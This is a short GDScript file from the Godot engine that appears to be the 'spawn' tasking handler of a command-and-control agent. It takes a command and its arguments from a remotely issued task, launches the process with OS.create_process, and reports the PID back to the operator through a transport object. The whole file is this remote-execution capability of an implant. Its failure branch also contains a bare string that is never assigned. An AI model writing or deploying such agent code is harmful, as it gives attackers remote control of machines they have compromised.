extends Node

func _on_tasking_spawn(transport, task):
	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var command = parameters.get("command")
	var arguments = parameters.get("arguments")
	print_debug("executing the following command and arguments")
	print_debug(command)
	print_debug(arguments)
	print_debug("")
	var pid = OS.create_process(command, arguments)

	print_debug("")
	print_debug(pid)
	print_debug("")
	
	var output = "Process Created with PID: %s" % [pid]
	
	if pid == -1:
		"Failed to create_process(%s %s)..." %[command, arguments]

	transport.send(
		transport.create_task_response(
			pid != -1,
			true,
			task.get("id"),
			output,
			[
				[
					"Process Create",
					command + " " + " ".join(PackedStringArray(arguments))
				]
			]
		)
	)
